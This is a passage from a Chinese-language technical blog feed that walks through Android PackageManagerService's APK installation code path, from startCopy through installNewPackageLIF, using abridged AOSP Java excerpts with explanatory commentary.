(mContainerService == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (!mBound) &#123;</div><div class="line">                <span class="comment">// Something seriously wrong since we are not bound and we are not</span></div><div class="line">                <span class="comment">// waiting for connection. Bail out.</span></div><div class="line">                ............            </div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                Slog.w(TAG, <span class="string">"Waiting to connect to media container service"</span>);</div><div class="line">            &#125;</div><div class="line">        <span class="comment">// 请求队列mPendingInstalls不为空</span></div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mPendingInstalls.size() &gt; <span class="number">0</span>) &#123;</div><div class="line">            HandlerParams params = mPendingInstalls.get(<span class="number">0</span>);</div><div class="line">            <span class="keyword">if</span> (params != <span class="keyword">null</span>) &#123;</div><div class="line">                ........</div><div class="line">                <span class="comment">//调用参数的startCopy函数处理安装请求</span></div><div class="line">                <span class="keyword">if</span> (params.startCopy()) &#123;</div><div class="line">                    ........</div><div class="line">                    <span class="comment">// Delete pending install</span></div><div class="line">                    <span class="keyword">if</span> (mPendingInstalls.size() &gt; <span class="number">0</span>) &#123;</div><div class="line">                        mPendingInstalls.remove(<span class="number">0</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">if</span> (mPendingInstalls.size() == <span class="number">0</span>) &#123;</div><div class="line">                        <span class="keyword">if</span> (mBound) &#123;</div><div class="line">                            ..........</div><div class="line">                            removeMessages(MCS_UNBIND);</div><div class="line">                            Message ubmsg = obtainMessage(MCS_UNBIND);</div><div class="line">                            <span class="comment">// Unbind after a little delay, to avoid</span></div><div class="line">                            <span class="comment">// continual thrashing.</span></div><div class="line">                            sendMessageDelayed(ubmsg, <span class="number">10000</span>);</div><div class="line">                        &#125;</div><div class="line">                    &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        <span class="comment">// There are more pending requests in queue.</span></div><div class="line">                        <span class="comment">// Just post MCS_BOUND message to trigger processing</span></div><div class="line">                        <span class="comment">// of next pending install.</span></div><div class="line">                        ......</div><div class="line">                        mHandler.sendEmptyMessage(MCS_BOUND);</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">                .........</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="comment">// Should never happen ideally.</span></div><div class="line">            Slog.w(TAG, <span class="string">"Empty queue"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">.......</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这一段代码比较好理解:</p>
<ul>
<li>如果mPendingInstalls不为空，调用<code>InstallParams.startCopy</code>函数处理安装请求。</li>
<li>接着如果mPendingInstalls不为空，发送MCS_BOUND继续处理下一个，直到队列为空。</li>
<li>如果队列为空，则等待一段时间后，发送MCS_UNBIND消息断开与安装服务的绑定。</li>
</ul>
<h1 id="九、startCopy"><a href="#九、startCopy" class="headerlink" title="九、startCopy"></a>九、startCopy</h1><p>/frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java</p>
<p>InstallParams继承HandlerParams，实际调用的是HandlerParams.startCopy:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">startCopy</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">boolean</span> res;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">if</span> (DEBUG_INSTALL) Slog.i(TAG, <span class="string">"startCopy "</span> + mUser + <span class="string">": "</span> + <span class="keyword">this</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (++mRetries &gt; MAX_RETRIES) &#123;</div><div class="line">            Slog.w(TAG, <span class="string">"Failed to invoke remote methods on default container service. Giving up"</span>);</div><div class="line">            mHandler.sendEmptyMessage(MCS_GIVE_UP);</div><div class="line">            handleServiceError();</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="comment">// 调用handleStartCopy()处理</span></div><div class="line">            handleStartCopy();</div><div class="line">            Slog.i(TAG, <span class="string">"Apk copy done"</span>);</div><div class="line">            res = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</div><div class="line">        <span class="keyword">if</span> (DEBUG_INSTALL) Slog.i(TAG, <span class="string">"Posting install MCS_RECONNECT"</span>);</div><div class="line">        mHandler.sendEmptyMessage(MCS_RECONNECT);</div><div class="line">        res = <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// </span></div><div class="line">    handleReturnCode();</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>PMS将先后调用handleStartCopy和handleReturnCode来完成主要的工作。</p>
<h2 id="9-1-handleStartCopy"><a href="#9-1-handleStartCopy" class="headerlink" title="9.1 handleStartCopy"></a>9.1 handleStartCopy</h2><p>handleStartCopy函数在HandleParams抽象类定义，在其子类InstallParams来实现，我们看看与实际安装相关的handleStartCopy函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleStartCopy</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</div><div class="line">    <span class="keyword">int</span> ret = PackageManager.INSTALL_SUCCEEDED;</div><div class="line"></div><div class="line">    <span class="comment">// 决定是安装在手机内还是sdcard中，设置对应标志位</span></div><div class="line">    <span class="keyword">if</span> (origin.staged) &#123;</div><div class="line">        <span class="keyword">if</span> (origin.file != <span class="keyword">null</span>) &#123;</div><div class="line">            installFlags |= PackageManager.INSTALL_INTERNAL;</div><div class="line">            installFlags &amp;= ~PackageManager.INSTALL_EXTERNAL;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (origin.cid != <span class="keyword">null</span>) &#123;</div><div class="line">            installFlags |= PackageManager.INSTALL_EXTERNAL;</div><div class="line">            installFlags &amp;= ~PackageManager.INSTALL_INTERNAL;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid stage location"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="comment">// 检查APK的安装位置是否正确</span></div><div class="line">    <span class="keyword">if</span> (onInt &amp;&amp; onSd) &#123;</div><div class="line">        <span class="comment">// Check if both bits are set.</span></div><div class="line">        Slog.w(TAG, <span class="string">"Conflicting flags specified for installing on both internal and external"</span>);</div><div class="line">        ret = PackageManager.INSTALL_FAILED_INVALID_INSTALL_LOCATION;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (onSd &amp;&amp; ephemeral) &#123;</div><div class="line">        Slog.w(TAG,  <span class="string">"Conflicting flags specified for installing ephemeral on external"</span>);</div><div class="line">        ret = PackageManager.INSTALL_FAILED_INVALID_INSTALL_LOCATION;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line">    <span class="comment">// createInstallArgs用于创建一个安装参数对象</span></div><div class="line">    <span class="keyword">final</span> InstallArgs args = createInstallArgs(<span class="keyword">this</span>);</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (ret == PackageManager.INSTALL_SUCCEEDED) &#123;</div><div class="line">        ...</div><div class="line">            <span class="comment">// 调用InstallArgs的copyApk函数</span></div><div class="line">            ret = args.copyApk(mContainerService, <span class="keyword">true</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    mRet = ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>InstallParams$handleStartCopy()主要功能是获取安装位置信息以及复制apk到指定位置。抽象类InstallArgs中的copyApk负责复制APK文件，具体实现在子类FileInstallArgs和SdInstallArgs里面。 </p>
<h2 id="9-2-handleReturnCode"><a href="#9-2-handleReturnCode" class="headerlink" title="9.2 handleReturnCode"></a>9.2 handleReturnCode</h2><p>InstallParams$handleReturnCode()中，调用processPendingInstall方法处理安装：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">handleReturnCode</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="comment">// If mArgs is null, then MCS couldn't be reached. When it</span></div><div class="line">    <span class="comment">// reconnects, it will try again to install. At that point, this</span></div><div class="line">    <span class="comment">// will succeed.</span></div><div class="line">    <span class="keyword">if</span> (mArgs != <span class="keyword">null</span>) &#123;</div><div class="line">        processPendingInstall(mArgs, mRet);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="9-3-processPendingInstall"><a href="#9-3-processPendingInstall" class="headerlink" title="9.3 processPendingInstall"></a>9.3 processPendingInstall</h2><p>主要的安装流程都在这个方法里面: PMS.processPendingInstall</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">private void processPendingInstall(final InstallArgs args, final int currentStatus) &#123;</div><div class="line">    mHandler.post(new Runnable() &#123;</div><div class="line">        public void run() &#123;</div><div class="line">            mHandler.removeCallbacks(this);</div><div class="line"></div><div class="line">            // Result object to be returned</div><div class="line">            PackageInstalledInfo res = new PackageInstalledInfo();</div><div class="line">            res.setReturnCode(currentStatus);</div><div class="line">            res.uid = -1;</div><div class="line">            res.pkg = null;</div><div class="line">            res.removedInfo = null;</div><div class="line">            if (res.returnCode == PackageManager.INSTALL_SUCCEEDED) &#123;</div><div class="line">                //1、预安装，检查包状态，确保环境ok，如果环境不ok，那么会清理拷贝的文件</div><div class="line">                args.doPreInstall(res.returnCode);</div><div class="line"></div><div class="line">                synchronized (mInstallLock) &#123;</div><div class="line">                    //2、安装，调用installPackageTracedLI进行安装</div><div class="line">                    installPackageTracedLI(args, res);</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                //3、安装收尾</div><div class="line">                args.doPostInstall(res.returnCode, res.uid);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            </div><div class="line">            if (!doRestore) &#123;</div><div class="line">                .......</div><div class="line">                //4、生成一个POST_INSTALL消息给PackageHanlder</div><div class="line">                Message msg = mHandler.obtainMessage(POST_INSTALL, token, 0);</div><div class="line">                mHandler.sendMessage(msg);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>安装过程放在一个线程里面，处理流程是预安装-安装-安装收尾-发送 POST_INSTALL消息：</p>
<ul>
<li><strong>预安装</strong>：检查当前安装包的状态以及确保SDCARD的挂载，并返回状态信息。在安装前确保安装环境的可靠。</li>
<li><strong>安装</strong>：对mInstallLock加锁，表明同时只能有一个安装包进行安装；然后调用installPackageTracedLI完成具体安装操作。</li>
<li><strong>安装收尾</strong>： 检查状态，如果安装不成功，删除掉相关目录文件。</li>
<li><strong>发送POST_INSTALL消息</strong>：该消息由PackageHandler接收。POST_INSTALL的主要工作其实还是通过广播、回调接口通知系统中的其它组件，有新的Pacakge安装或发生了改变。  </li>
</ul>
<p>从上面我们可以知道，具体安装apk的函数是<code>PMS.installPackageTracedLI</code>。</p>
<h1 id="十、installPackageTracedLI"><a href="#十、installPackageTracedLI" class="headerlink" title="十、installPackageTracedLI"></a>十、installPackageTracedLI</h1><p>PMS.installPackageTracedLI函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">installPackageTracedLI</span><span class="params">(InstallArgs args, PackageInstalledInfo res)</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        Trace.traceBegin(TRACE_TAG_PACKAGE_MANAGER, <span class="string">"installPackage"</span>);</div><div class="line">        installPackageLI(args, res);</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        Trace.traceEnd(TRACE_TAG_PACKAGE_MANAGER);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="十一、installPackageLI"><a href="#十一、installPackageLI" class="headerlink" title="十一、installPackageLI"></a>十一、installPackageLI</h1><p>继续PMS.installPackageLI：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">installPackageLI</span><span class="params">(InstallArgs args, PackageInstalledInfo res)</span> </span>&#123;</div><div class="line">    </div><div class="line">    <span class="comment">// PackageParser对象</span></div><div class="line">    PackageParser pp = <span class="keyword">new</span> PackageParser();</div><div class="line">    pp.setSeparateProcesses(mSeparateProcesses);</div><div class="line">    pp.setDisplayMetrics(mMetrics);</div><div class="line"></div><div class="line">    Trace.traceBegin(TRACE_TAG_PACKAGE_MANAGER, <span class="string">"parsePackage"</span>);</div><div class="line">    <span class="keyword">final</span> PackageParser.Package pkg;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">if</span> (DEBUG_INSTALL) Slog.i(TAG, <span class="string">"Start parsing apk: "</span> + installerPackageName);</div><div class="line">        <span class="comment">// 1.开始解析我们的package</span></div><div class="line">        pkg = pp.parsePackage(tmpPackageFile, parseFlags);</div><div class="line">        <span class="keyword">if</span> (DEBUG_INSTALL) Slog.i(TAG, <span class="string">"Parsing done for apk: "</span> + installerPackageName);</div><div class="line">    &#125; <span class="keyword">catch</span> (PackageParserException e) &#123;</div><div class="line">        res.setError(<span class="string">"Failed parse during installPackageLI"</span>, e);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        Trace.traceEnd(TRACE_TAG_PACKAGE_MANAGER);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="comment">//2. 加载证书，获取签名信息</span></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">// either use what we've been given or parse directly from the APK</span></div><div class="line">        <span class="keyword">if</span> (args.certificates != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                PackageParser.populateCertificates(pkg, args.certificates);</div><div class="line">            &#125; <span class="keyword">catch</span> (PackageParserException e) &#123;</div><div class="line">                PackageParser.collectCertificates(pkg, parseFlags);</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            PackageParser.collectCertificates(pkg, parseFlags);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">catch</span> (PackageParserException e) &#123;</div><div class="line">        res.setError(<span class="string">"Failed collect during installPackageLI"</span>, e);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">synchronized</span> (mPackages) &#123;</div><div class="line">        <span class="comment">// 3.检测packages是否存在</span></div><div class="line">        <span class="keyword">if</span> ((installFlags &amp; PackageManager.INSTALL_REPLACE_EXISTING) != <span class="number">0</span>) &#123;</div><div class="line">                ...</div><div class="line">                replace = <span class="keyword">true</span>;</div><div class="line">                </div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mPackages.containsKey(pkgName)) &#123;</div><div class="line">                ...</div><div class="line">                replace = <span class="keyword">true</span>;</div><div class="line">                <span class="keyword">if</span> (DEBUG_INSTALL) Slog.d(TAG, <span class="string">"Replace existing pacakge: "</span> + pkgName);</div><div class="line">            &#125;</div><div class="line">            ...           </div><div class="line">        &#125;</div><div class="line">    &#125;    </div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">try</span> (PackageFreezer freezer = freezePackageForInstall(pkgName, installFlags,</div><div class="line">            <span class="string">"installPackageLI"</span>)) &#123;</div><div class="line">        <span class="keyword">if</span> (replace) &#123;</div><div class="line">            <span class="comment">// 4.更新已经存在的packages</span></div><div class="line">            replacePackageLIF(pkg, parseFlags, scanFlags | SCAN_REPLACING, args.user,</div><div class="line">                    installerPackageName, res);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="comment">// 5.安装新的packages</span></div><div class="line">            installNewPackageLIF(pkg, parseFlags, scanFlags | SCAN_DELETE_DATA_ON_FAILURES,</div><div class="line">                    args.user, installerPackageName, volumeUuid, res);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数过程比较长，主要做了几件事：</p>
<ul>
<li>PackageParser$parsePackage，主要是解析APK的AndroidManifest.xml，将每个标签对应的信息添加到Package的相关列表中，如将<application>下的<activity>信息添加到Package的activities列表等。 </activity></application></li>
<li>加载apk证书，获取签名信息</li>
<li>检查目前安装的APK是否在系统中已存在: <ul>
<li>已存在，则调用<code>replacePackageLIF</code>进行替换安装。 </li>
<li>不存在，否则调用<code>installNewPackageLIF</code>进行安装。</li>
</ul>
</li>
</ul>
<h2 id="11-1-replacePackageLIF"><a href="#11-1-replacePackageLIF" class="headerlink" title="11.1 replacePackageLIF"></a>11.1 replacePackageLIF</h2><p>如果需要替换的是系统APP，则调用Settings$disableSystemPackageLPw来disable旧的APK；如果替换的是非系统APP，则调用deletePackageLI删除旧的APK。</p>
<p>因为这个过程实在太差，没有必要贴出来一一分析，我来简化一下flow，有兴趣的读者可以深入跟进：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">replacePackageLIF</div><div class="line">    replaceSystemPackageLIF  // 系统 pkg</div><div class="line">        removePackageLI</div><div class="line">        disableSystemPackageLPw</div><div class="line">        clearAppDataLIF</div><div class="line">        scanPackageTracedLI  //安装apk</div><div class="line">            scanPackageLI</div><div class="line">                scanPackageDirtyLI  </div><div class="line">        updateSettingsLI</div><div class="line">        updatePermissionsLPw</div><div class="line">        mSettings.writeLPr();</div><div class="line"></div><div class="line">    replaceNonSystemPackageLIF  // 非系统 pkg</div><div class="line">        deletePackageLIF</div><div class="line">        clearAppDataLIF</div><div class="line">        clearAppProfilesLIF</div><div class="line">        scanPackageTracedLI    // 安装apk</div><div class="line">            scanPackageLI</div><div class="line">                scanPackageDirtyLI  </div><div class="line">        updateSettingsLI</div><div class="line">        updatePermissionsLPw</div><div class="line">        mSettings.writeLPr();</div></pre></td></tr></table></figure>
<p>不管是更新系统还是非系统apk，都会先清除之前的packages信息，然后通过scanPackageTracedLI去安装apk，安装完后更新permissions和setting，最后通过writeLPr更新packages.xml。</p>
<p>关于scanPackageTracedLI和Settings.writeLPr();我有在上一篇blog讲过，可以回去看看。</p>
<h2 id="11-2-installNewPackageLIF"><a href="#11-2-installNewPackageLIF" class="headerlink" title="11.2 installNewPackageLIF"></a>11.2 installNewPackageLIF</h2><p>PMS.installNewPackageLIF用于安装新的apk：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">installNewPackageLIF</span><span class="params">(PackageParser.Package pkg, <span class="keyword">final</span> <span class="keyword">int</span> policyFlags,</span></span></div><div class="line">            <span class="keyword">int</span> scanFlags, UserHandle user, String installerPackageName, String volumeUuid,</div><div class="line">            PackageInstalledInfo res) &#123;</div><div class="line">        Trace.traceBegin(TRACE_TAG_PACKAGE_MANAGER, <span class="string">"installNewPackage"</span>);</div><div class="line"></div><div class="line">        <span class="comment">// Remember this for later, in case we need to rollback this install</span></div><div class="line">        String pkgName = pkg.packageName;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (DEBUG_INSTALL) Slog.d(TAG, <span class="string">"installNewPackageLI: "</span> + pkg);</div><div class="line"></div><div class="line">        <span class="comment">// package已经存在</span></div><div class="line">        <span class="keyword">synchronized</span>(mPackages) &#123;</div><div class="line">            <span class="keyword">if</span> (mSettings.mRenamedPackages.containsKey(pkgName)) &#123;</div><div class="line">                <span class="comment">// A package with the same name is already installed, though</span></div><div class="line">                <span class="comment">// it has been renamed to an older name.  The package we</span></div><div class="line">                <span class="comment">// are trying to install should be installed as an update to</span></div><div class="line">                <span class="comment">// the existing one, but that has not been requested, so bail.</span></div><div class="line">                res.setError(INSTALL_FAILED_ALREADY_EXISTS, <span class="string">"Attempt to re-install "</span> + pkgName</div><div class="line">                        + <span class="string">" without first uninstalling package running as "</span></div><div class="line">                        + mSettings.mRenamedPackages.get(pkgName));</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (mPackages.containsKey(pkgName)) &#123;</div><div class="line">                <span class="comment">// Don't allow installation over an existing package with the same name.</span></div><div class="line">                res.setError(INSTALL_FAILED_ALREADY_EXISTS, <span class="string">"Attempt to re-install "</span> + pkgName</div><div class="line">                        + <span class="string">" without first uninstalling."</span>);</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="comment">// 1. 安装apk</span></div><div class="line">            PackageParser.Package newPackage = scanPackageTracedLI(pkg, policyFlags, scanFlags,</div><div class="line">                    System.currentTimeMillis(), user);</div><div class="line"></div><div class="line">            <span class="comment">// 2. 更新setting</span></div><div class="line">            updateSettingsLI(newPackage, installerPackageName, <span class="keyword">null</span>, res, user);</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (res.returnCode == PackageManager.INSTALL_SUCCEEDED) &#123;</div><div class="line">                prepareAppDataAfterInstallLIF(newPackage);</div><div class="line"></div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="comment">// Remove package from internal structures, but keep around any</span></div><div class="line">                <span class="comment">// data that might have already existed</span></div><div class="line">                deletePackageLIF(pkgName, UserHandle.ALL, <span class="keyword">false</span>, <span class="keyword">null</span>,</div><div class="line">                        PackageManager.DELETE_KEEP_DATA, res.removedInfo, <span class="keyword">true</span>, <span class="keyword">null</span>);</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">catch</span> (PackageManagerException e) &#123;</div><div class="line">            res.setError(<span class="string">"Package couldn't be installed in "</span> + pkg.codePath, e);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Trace.traceEnd(TRACE_TAG_PACKAGE_MANAGER);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>installNewPackageLIF会调用scanPackageTracedLI去安装apk，最终会调用scanPackageLI-&gt;scanPackageDirtyLI实际去安装apk。</p>
<p>由于之前有描述过，便不再叙述。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍APK的安装流程。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Android" scheme="https://maoao530.github.io/tags/Android/"/>
    
      <category term="PMS" scheme="https://maoao530.github.io/tags/PMS/"/>
    
  </entry>
  
  <entry>
    <title>PackageManagerService启动流程</title>
    <link href="https://maoao530.github.io/2017/01/10/packagemanager/"/>
    <id>https://maoao530.github.io/2017/01/10/packagemanager/</id>
    <published>2017-01-10T14:04:59.000Z</published>
    <updated>2017-01-31T07:11:49.106Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍PackageManagerService启动流程。</p>
<a id="more"></a>
<p>相关源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java</div><div class="line">frameworks/base/services/core/java/com/android/server/pm/PackageInstallerService.java</div><div class="line">frameworks/base/services/core/java/com/android/server/pm/Settings.java</div><div class="line">frameworks/base/services/core/java/com/android/server/pm/Installer.java</div><div class="line">frameworks/base/services/core/java/com/android/server/SystemConfig.java</div><div class="line"></div><div class="line">frameworks/base/core/java/android/content/pm/PackageManager.java</div><div class="line">frameworks/base/core/java/android/content/pm/IPackageManager.aidl</div><div class="line">frameworks/base/core/java/android/content/pm/PackageParser.java</div><div class="line"></div><div class="line">frameworks/base/core/java/com/android/internal/os/InstallerConnection.java</div><div class="line">frameworks/base/cmds/pm/src/com/android/commands/pm/Pm.java</div></pre></td></tr></table></figure></p>
